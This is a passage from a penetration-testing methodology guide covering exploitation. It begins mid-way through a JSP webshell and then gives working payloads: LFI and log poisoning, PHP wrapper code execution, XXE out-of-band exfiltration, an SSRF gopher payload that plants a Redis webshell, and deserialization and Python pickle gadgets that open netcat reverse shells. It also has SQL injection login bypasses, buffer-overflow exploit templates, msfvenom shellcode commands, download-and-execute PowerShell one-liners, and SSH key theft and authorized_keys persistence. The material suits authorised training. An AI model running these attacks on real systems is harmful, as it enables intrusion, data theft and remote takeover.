InputStream in = p.getInputStream();
int a = -1;
byte[] b = new byte[2048];
while((a=in.read(b))!=-1){
    out.println(new String(b));
}
%>
```

---

## 3.6 LFI/RFI ‚Üí RCE Techniques

### Local File Inclusion (LFI) Paths

```bash
# Linux
../../../etc/passwd
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
/etc/passwd%00
/etc/passwd%00.php

# Windows
..\..\..\windows\system32\drivers\etc\hosts
..%5c..%5c..%5cwindows/system32/drivers/etc/hosts
C:\Windows\System32\drivers\etc\hosts
```

### Log Poisoning

```bash
# 1. Poison Apache access log
curl -A "<?php system(\$_GET['cmd']); ?>" http://<RHOST>/

# 2. Poison Apache error log (via User-Agent)
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://<RHOST>/invalid

# 3. Poison SSH auth log (if readable)
ssh '<?php system($_GET["cmd"]); ?>'@<RHOST>

# 4. Include poisoned log
http://<RHOST>/index.php?page=../../../../var/log/apache2/access.log&cmd=id
http://<RHOST>/index.php?page=../../../../var/log/auth.log&cmd=id

# Common log locations
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/httpd/access_log
/var/log/httpd/error_log
/var/log/nginx/access.log
/var/log/auth.log
/var/log/mail.log
/proc/self/environ
/proc/self/fd/[0-10]
```

### PHP Wrappers

```bash
# php://filter - Read source code
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php

# php://input - Execute POST data
# URL: http://<RHOST>/index.php?page=php://input
# POST: <?php system('id'); ?>

# data:// wrapper
data://text/plain,<?php system('id'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# expect:// (if enabled)
expect://id
expect://whoami

# zip:// wrapper
# Create zip: zip shell.zip shell.php
# Upload shell.zip
zip://shell.zip%23shell.php

# phar:// wrapper
# Create malicious phar file
phar://uploads/shell.phar/test.txt
```

### Session File Poisoning

```bash
# 1. Set malicious session data
# Send request with session containing PHP code

# 2. Include session file
# Linux
/var/lib/php/sessions/sess_<SESSIONID>
/tmp/sess_<SESSIONID>

# Windows
C:\Windows\Temp\sess_<SESSIONID>
```

---

## 3.7 Advanced Web Attacks

### 3.7.1 XXE (XML External Entity) Exploitation

**Basic XXE - File Read:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

**XXE - Windows File Read:**

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]>
<order><quantity>3</quantity><item>&test;</item></order>
```

**XXE - SSRF:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://<LHOST>:80/shell.php"> ]>
<foo>&xxe;</foo>

<!-- AWS metadata -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
```

**Blind XXE - Out-of-Band:**

```xml
<!-- External DTD on attacker server (evil.dtd) -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://<LHOST>/?x=%file;'>">
%eval;
%exfiltrate;

<!-- Payload -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://<LHOST>/evil.dtd"> %xxe;]>
```

**XXE - SSH Key Extraction:**

```xml
<!DOCTYPE username [
  <!ENTITY username SYSTEM "/root/.ssh/id_rsa">
]>
<user>&username;</user>
```

### 3.7.2 SSRF (Server-Side Request Forgery)

**Basic SSRF Payloads:**

```bash
# Localhost access
http://127.0.0.1/admin
http://localhost/admin
http://[::1]/admin
http://127.1/admin

# AWS metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Internal services
http://192.168.0.1/
http://10.0.0.1/
http://172.16.0.1/

# Port scanning
http://127.0.0.1:22
http://127.0.0.1:3306
http://127.0.0.1:6379

# File protocol
file:///etc/passwd
file:///c:/windows/win.ini

# Gopher protocol (Redis example)
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$34%0d%0a%0a%0a<%3fphp%20system($_GET['cmd'])%3b%3f>%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

**SSRF Bypass Techniques:**

```bash
# IP variations
http://127.0.0.1
http://127.1
http://0x7f000001
http://2130706433
http://017700000001

# DNS rebinding
# Use services like:
# - localtest.me (resolves to 127.0.0.1)
# - spoofed.burpcollaborator.net

# URL encoding
http://127.0.0.1%2f%61%64%6d%69%6e

# Redirect bypass
# Host redirect script that redirects to internal IP
```

### 3.7.3 Deserialization Attacks

**Java Deserialization (ysoserial):**

```bash
# Generate payload
java -jar ysoserial.jar CommonsCollections5 "nc <LHOST> <LPORT> -e /bin/sh" > payload.ser
java -jar ysoserial.jar CommonsCollections5 "powershell -enc <BASE64>" > payload.ser

# Common gadget chains to try
CommonsCollections1-7
Spring1-2
Groovy1
JRMPClient
```

**PHP Deserialization:**

```php
<?php
class Example {
    public $data = 'id';
}
echo serialize(new Example());
// O:7:"Example":1:{s:4:"data";s:2:"id";}
?>
```

**Python Pickle:**

```python
import pickle
import os
import base64

class RCE:
    def __reduce__(self):
        return (os.system, ('nc <LHOST> <LPORT> -e /bin/sh',))

print(base64.b64encode(pickle.dumps(RCE())))
```

---

## 3.8 Authentication Bypass Techniques

### 3.8.1 SQL Injection Login Bypass

```sql
-- Basic bypasses
admin' OR '1'='1
admin' OR 1=1--
' OR 1=1--
' OR '1'='1' -- 
admin'/*
admin' -- 
' OR ''='
') OR ('1'='1
") OR ("1"="1

-- MySQL comment bypass
admin'/*!50000OR*/1=1--

-- Union-based bypass
' UNION SELECT 1,'admin','password_hash'--

-- Password field bypass
' OR password LIKE 'a%'--

-- No quotes needed (numeric)
1 OR 1=1
1) OR (1=1
```

### 3.8.2 Session & JWT Attacks

**JWT Manipulation:**

```bash
# Decode JWT
echo "<JWT_TOKEN>" | cut -d '.' -f 2 | base64 -d

# None algorithm attack
# Change header to: {"alg":"none","typ":"JWT"}
# Remove signature (keep the trailing dot)

# Weak key brute force
hashcat -m 16500 jwt.txt wordlist.txt
john jwt.txt --wordlist=wordlist.txt --format=HMAC-SHA256

# JWT tool
python3 jwt_tool.py <JWT_TOKEN>
python3 jwt_tool.py <JWT_TOKEN> -T  # Tamper mode
python3 jwt_tool.py <JWT_TOKEN> -C -d wordlist.txt  # Crack

# Key confusion attack (RS256 to HS256)
# Use public key as HMAC secret
```

**Session Cookie Manipulation:**

```bash
# Decode base64 session
echo "SESSION_VALUE" | base64 -d

# Common session formats
# PHP: a:1:{s:4:"user";s:5:"admin";}
# .NET: serialized object
# Java: serialized object

# Session fixation
# Set known session ID before login
Cookie: PHPSESSID=attacker_controlled_value

# Session prediction
# Capture multiple sessions and analyze pattern
```

---

## 3.9 Buffer Overflow Exploitation

### 3.9.1 Fuzzing

**Basic Python Fuzzer:**

```python
#!/usr/bin/env python3
import socket, sys

# Variables
ip = "RHOST"
port = 9999
timeout = 5

# Create buffer
buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

# Send fuzzed data
for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        
        print(f"Fuzzing with {len(string)} bytes")
        s.send(bytes(string + "\r\n", "latin-1"))
        s.recv(1024)
        s.close()
    except:
        print(f"Could not connect to {ip}:{port}")
        print(f"Crashed at {len(string)} bytes")
        sys.exit(0)
```

**Metasploit Pattern Create:**

```bash
# Create pattern
msf-pattern_create -l 3000

# Find offset after crash
msf-pattern_offset -l 3000 -q <EIP_VALUE>
```

### 3.9.2 EIP Control

**Exploit Template:**

```python
#!/usr/bin/env python3
import socket

ip = "RHOST"
port = 9999

# Offset found from pattern
offset = 2003
overflow = "A" * offset
retn = "BBBB"  # Should overwrite EIP with 42424242
padding = ""
payload = ""
postfix = ""

buffer = overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(bytes(buffer + "\r\n", "latin-1"))
    print("Done!")
except:
    print("Could not connect.")
```

### 3.9.3 Bad Character Identification

**Generate Bad Characters:**

```python
# Generate all characters 00-FF
for x in range(1, 256):
    print("\\x" + "{:02x}".format(x), end='')
print()

# Common bad characters to test
badchars = (
    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
    b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
    b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
    b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
    b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
    b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
    b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
    b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
    b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
    b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
    b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
    b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
    b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
    b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
    b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
```

**Testing in Immunity Debugger:**

```
1. Attach debugger to vulnerable application
2. Send exploit with bad characters in payload section
3. Right-click ESP register ‚Üí Follow in Dump
4. Compare sent characters with received
5. Remove any truncated/modified characters
6. Repeat until all bad characters identified
```

### 3.9.4 Finding JMP ESP

**Using Mona:**

```
# In Immunity Debugger command line
!mona modules

# Find module with no protections (ASLR: False, Rebase: False, SafeSEH: False, NXCompat: False)
!mona jmp -r esp -cpb "\x00\x07\x2e\xa0"  # Exclude bad characters

# Alternative: find JMP ESP manually
!mona find -s "\xff\xe4" -m modulename.dll
```

**Using msf-nasm_shell:**

```bash
msf-nasm_shell
nasm > jmp esp
00000000  FFE4              jmp esp
```

### 3.9.5 Final Exploit

**Complete Exploit Template:**

```python
#!/usr/bin/env python3
import socket

ip = "RHOST"
port = 9999

offset = 2003
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"  # JMP ESP address (little endian)
padding = "\x90" * 16       # NOP sled
payload = (
    # msfvenom generated shellcode here
)
postfix = ""

buffer = overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(bytes(buffer + "\r\n", "latin-1"))
    print("Done!")
except:
    print("Could not connect.")
```

**Generate Shellcode:**

```bash
# Reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c

# Meterpreter
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> EXITFUNC=thread -b "\x00" -f python

# Linux
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -b "\x00" -f python
```

---

## 3.10 File Transfer Methods

### Linux File Transfer

**HTTP Server (Python):**

```bash
# Python 3
python3 -m http.server 80

# Python 2
python -m SimpleHTTPServer 80

# Updog (better alternative)
updog -p 80

# Download on target
wget http://<LHOST>/file
curl http://<LHOST>/file -o file
```

**Netcat Transfer:**

```bash
# On attacker (sender)
nc -nlvp 4444 < file

# On target (receiver)
nc <LHOST> 4444 > file

# Alternative (sender on target)
nc <LHOST> 4444 < file

# Receiver on attacker
nc -nlvp 4444 > file
```

**Base64 Transfer:**

```bash
# On attacker
base64 file -w 0  # Copy output

# On target
echo "<BASE64_STRING>" | base64 -d > file
```

**SCP:**

```bash
# Upload to target
scp file user@<RHOST>:/tmp/file

# Download from target
scp user@<RHOST>:/path/to/file .
```

**PHP File Download:**

```php
<?php file_put_contents("file.txt", file_get_contents("http://<LHOST>/file.txt")); ?>
```

### Windows File Transfer

**PowerShell Download:**

```powershell
# Download file
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://<LHOST>/file.exe', 'C:\Temp\file.exe')"

# Download and execute in memory
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/script.ps1')"

# Alternative
powershell -c "Invoke-WebRequest -Uri 'http://<LHOST>/file.exe' -OutFile 'C:\Temp\file.exe'"
powershell -c "wget 'http://<LHOST>/file.exe' -OutFile 'file.exe'"

# Bypass execution policy
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/script.ps1')"
```

**Certutil:**

```cmd
certutil -urlcache -f http://<LHOST>/file.exe file.exe
certutil -urlcache -split -f http://<LHOST>/file.exe file.exe
```

**BITSAdmin:**

```cmd
bitsadmin /transfer myDownloadJob /download /priority normal http://<LHOST>/file.exe C:\Temp\file.exe
```

**SMB Transfer:**

```bash
# On attacker (start SMB server)
impacket-smbserver share $(pwd) -smb2support
impacket-smbserver share . -smb2support -username user -password pass

# On Windows target
copy \\<LHOST>\share\file.exe C:\Temp\file.exe
net use \\<LHOST>\share /user:user pass
```

**FTP Transfer:**

```bash
# On attacker
python -m pyftpdlib -p 21 -w

# On Windows target
echo open <LHOST> > ftp.txt
echo anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo binary >> ftp.txt
echo GET file.exe >> ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt
```

**VBScript Download (Old Windows):**

```vb
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs

cscript wget.vbs http://<LHOST>/file.exe file.exe
```

---

## 3.11 SSH Key Exploitation

### Finding SSH Keys

```bash
# Search for SSH keys
find / -name id_rsa 2>/dev/null
find / -name id_dsa 2>/dev/null
find / -name authorized_keys 2>/dev/null
find /home -name id_rsa 2>/dev/null

# Common locations
~/.ssh/id_rsa
~/.ssh/id_dsa
~/.ssh/id_ecdsa
~/.ssh/id_ed25519
/root/.ssh/id_rsa
/home/*/.ssh/id_rsa

# Check permissions
ls -la ~/.ssh/
```

### Exploiting Found Keys

```bash
# Copy private key to attacker machine
cat /home/user/.ssh/id_rsa

# Save to file on attacker
nano id_rsa  # Paste key
chmod 600 id_rsa

# Connect with key
ssh -i id_rsa user@<RHOST>

# If key is encrypted, crack it
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

### Authorized Keys Exploitation

```bash
# Generate SSH key pair on attacker
ssh-keygen -f attack_key

# Add public key to target's authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2E... attacker@kali" >> ~/.ssh/authorized_keys

# Ensure proper permissions
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys

# Connect from attacker
ssh -i attack_key user@<RHOST>
```

### SSH Agent Forwarding Hijack

```bash
# Check for agent sockets
ps aux | grep ssh-agent
echo $SSH_AUTH_SOCK
ls -la /tmp/ssh-*

# Hijack socket (if accessible)
SSH_AUTH_SOCK=/tmp/ssh-XXX/agent.XXX ssh-add -l
SSH_AUTH_SOCK=/tmp/ssh-XXX/agent.XXX ssh user@other_host
```

---

## 3.12 Documentation Standards

### Exploitation Documentation Template

```markdown
## Vulnerability: [NAME]

**Severity:** Critical/High/Medium/Low
**Service:** [Service Name] on port [PORT]
**CVE:** [CVE-ID if applicable]

### Discovery
- Discovered during: [Enumeration phase]
- Detection method: [How it was found]
- Indicators: [Version numbers, error messages, etc.]

### Reproduction Steps

1. **Verify vulnerability:**
   ```bash
   [Command used to verify]
```

2. **Prepare exploit:**
    
    ```bash
    [Setup commands]
    ```
    
3. **Execute exploit:**
    
    ```bash
    [Exact exploit command]
    ```
    
4. **Verify access:**
    
    ```bash
    [Verification commands]
    ```
    

### Evidence

- Screenshot: [exploit_execution.png]
- Screenshot: [initial_access.png]
- User obtained: [username]
- Shell type: [reverse/bind/webshell]
- Privileges: [user/low-privileged/system]

### Remediation

- Update [service] to version [X.X.X]
- Disable [feature]
- Implement [security control]

### References

- [Exploit-DB link]
- [CVE details]
- [Vendor advisory]

````

### Screenshot Requirements

**Always capture:**
1. Exploit execution command
2. Initial access/shell prompt with `whoami` and `id`
3. Proof of access (`hostname`, `ipconfig/ifconfig`)
4. Any sensitive data accessed (user.txt, root.txt flags)

### Command History Logging

```bash
# Log all commands during exploitation
script -a exploitation_log.txt

# When done
exit  # Stop logging

# Alternative: save all commands
history > exploitation_commands.txt
````

---

## 3.13 Common Exploitation Scenarios

### Scenario 1: Web Application ‚Üí Shell

```
1. Identify web vulnerability (SQLi/LFI/File Upload)
2. Gain code execution (webshell)
3. Upgrade to reverse shell
4. Stabilize shell
5. Begin post-exploitation
```

### Scenario 2: Service Exploit ‚Üí Shell

```
1. Identify vulnerable service version
2. Search for public exploit
3. Modify exploit for target
4. Set up listener
5. Execute exploit
6. Catch shell
7. Stabilize and document
```

### Scenario 3: Credentials ‚Üí SSH Access

```
1. Obtain credentials (brute force/password reuse)
2. Verify SSH access
3. Log in via SSH
4. Document access method
5. Begin privilege escalation
```

### Scenario 4: Buffer Overflow ‚Üí Shell

```
1. Fuzz application to find crash point
2. Control EIP with pattern
3. Identify bad characters
4. Find JMP ESP gadget
5. Generate shellcode
6. Build final exploit
7. Execute and catch shell
```

---

## 3.14 Troubleshooting Common Issues

### Shell Not Connecting

```bash
# Check firewall rules
sudo iptables -L

# Verify listener is running
ss -tlnp | grep <LPORT>

# Test connectivity
# On target:
ping <LHOST>
nc -zv <LHOST> <LPORT>

# Try different ports (80, 443, 53, 8080)
# Try different shell types (bash, python, php)
# Try different protocols (TCP vs UDP)
```

### Shell Dies Immediately

```bash
# Add stabilization immediately
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Check for shell timeout
# Add infinite loop if needed in payload

# Use more stable shell method
# Try socat instead of netcat
```

### Exploit Not Working

```bash
# Verify vulnerability still exists
# Check version number carefully
# Review exploit code for requirements
# Check for ASLR/DEP protections
# Try alternative exploit
# Adjust payload for environment
```

### File Transfer Failing

```bash
# Verify HTTP server is running
python3 -m http.server 80

# Check target can reach attacker
ping <LHOST>

# Try alternative transfer method
# Check available tools on target: wget, curl, nc, ftp

# Verify file permissions and path
ls -la /tmp
df -h  # Check disk space
```

---

## 3.15 Quick Win Checks

### Before Heavy Exploitation

```bash
# Try default credentials
admin:admin
admin:password
root:root
root:toor

# Check for anonymous access
ftp <RHOST>  # anonymous:anonymous
mysql -h <RHOST> -u root  # No password

# Test for misconfigurations
# Exposed .git directories
# Publicly writable shares
# Unrestricted file upload

# Look for quick wins
searchsploit <service> <version> | grep -i "remote code execution"
```

---

## 3.16 Post-Exploitation Readiness

### Immediate Actions After Shell Access

```bash
# 1. Stabilize shell first
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 2. Basic enumeration
whoami
id
hostname
uname -a
ip a / ifconfig

# 3. Check sudo rights
sudo -l

# 4. Find flags
find / -name user.txt 2>/dev/null
find / -name root.txt 2>/dev/null

# 5. Check for other users
cat /etc/passwd | grep -v nologin

# 6. Begin privilege escalation enumeration
```

---

## 3.17 Tool References

### Essential Tools

```bash
# Exploitation
searchsploit
msfconsole
msfvenom

# Web testing
burpsuite
gobuster
nikto

# Buffer overflow
immunity debugger (Windows)
mona.py
gdb / gdb-peda (Linux)

# File transfer
python3 http.server
impacket-smbserver
updog

# Shell catching
nc / ncat
rlwrap
socat
```

### Quick Command Reference

```bash
# Start HTTP server
python3 -m http.server 80

# Start SMB server
impacket-smbserver share . -smb2support

# Catch reverse shell
rlwrap nc -nlvp 443

# Generate payload
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell

# Search exploits
searchsploit -m <exploit_id>

# Update exploit-db
searchsploit -u
```

---

## üéØ Success Criteria

Before moving to Phase 4 (Privilege Escalation), ensure:

- ‚úÖ Shell access obtained on target system
- ‚úÖ Shell is stabilized and functional
- ‚úÖ Current user and permissions identified
- ‚úÖ System information gathered (OS, kernel, hostname)
- ‚úÖ Exploitation steps fully documented with screenshots
- ‚úÖ File transfer capability established
- ‚úÖ Access method can be reproduced
- ‚úÖ All commands logged for report

